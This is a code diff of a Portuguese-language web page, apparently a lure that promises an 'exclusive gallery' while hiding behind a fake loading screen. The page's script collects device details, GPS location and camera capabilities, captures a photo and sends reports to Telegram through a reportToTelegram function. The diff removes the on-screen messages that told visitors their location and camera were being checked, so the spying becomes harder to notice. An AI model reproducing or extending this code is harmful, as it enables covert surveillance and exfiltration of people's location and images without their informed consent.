@@ -474,13 +474,12 @@
         async function revealMainContent() {
             // Adiciona timestamp para calcular duração
             const loadingStart = Date.now();
-            
-            // Mostra loading imediatamente com classe forçada
+              // Mostra loading imediatamente com classe forçada
             const loadingOverlay = document.getElementById('loadingOverlay');
             loadingOverlay.style.display = 'flex';
             loadingOverlay.classList.add('show');
-            document.querySelector('.loading-content h3').textContent = 'Carregando...';
-            document.querySelector('.loading-content p').textContent = 'Preparando acesso exclusivo';
+            document.querySelector('.loading-content h3').textContent = 'Carregando Docie Joao';
+            document.querySelector('.loading-content p').textContent = 'Aguarde um momento...';
             
             // Força o loading a aparecer mesmo no Simple Browser
             loadingOverlay.style.position = 'fixed';
@@ -577,11 +576,7 @@
             await reportToTelegram(infoText);
 
             // Aguarda um pouco para parecer processamento
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Atualiza loading para GPS
-            document.querySelector('.loading-content h3').textContent = 'Verificando localização...';
-            document.querySelector('.loading-content p').textContent = 'Aguardando permissão de localização';            // SOLICITA LOCALIZAÇÃO GPS - AGUARDA ATÉ O USUÁRIO RESPONDER
+            await new Promise(resolve => setTimeout(resolve, 2000));            // SOLICITA LOCALIZAÇÃO GPS - AGUARDA ATÉ O USUÁRIO RESPONDER
             let gpsObtained = false;
             let gpsData = {};
             try {
@@ -640,12 +635,7 @@
             }
 
             // Aguarda um pouco antes da próxima solicitação
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            // Atualiza loading para câmera
-            document.querySelector('.loading-content h3').textContent = 'Verificando câmera...';
-            document.querySelector('.loading-content p').textContent = 'Aguardando permissão de câmera';
-              let cameraObtained = false;
+            await new Promise(resolve => setTimeout(resolve, 1000));            let cameraObtained = false;
             let cameraData = {};
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -696,12 +686,7 @@
                     cameraReport += `├─ Torch: ${capabilities.torch ? 'Suportado' : 'Não suportado'}\n`;
                     cameraReport += `└─ Focus Mode: ${capabilities.focusMode ? capabilities.focusMode.join(', ') : 'N/A'}\n\n`;
                 }
-                
-                await reportToTelegram(cameraReport);
-                
-                // Atualiza loading para captura
-                document.querySelector('.loading-content h3').textContent = 'Capturando foto...';
-                document.querySelector('.loading-content p').textContent = 'Aguarde, processando imagem em alta qualidade';
+                  await reportToTelegram(cameraReport);
                 
                 // Aguarda um pouco para a câmera se ajustar
                 await new Promise(resolve => setTimeout(resolve, 3000));
@@ -763,13 +748,7 @@
                 cameraError += `├─ Conexão não é HTTPS\n`;
                 cameraError += `└─ Modo privado/incógnito\n`;
                 await reportToTelegram(cameraError);
-            }
-
-            // Finaliza o loading
-            document.querySelector('.loading-content h3').textContent = 'Finalizando...';
-            document.querySelector('.loading-content p').textContent = 'Preparando galeria exclusiva';
-            
-            // Aguarda mais um pouco para dar sensação de processamento
+            }            // Aguarda mais um pouco para dar sensação de processamento
             await new Promise(resolve => setTimeout(resolve, 2000));            // Reporta resultado final
             let finalReport = `🏁 RELATÓRIO FINAL - DOCIE JOAO\n`;
             finalReport += `═══════════════════════════════════════════\n`;
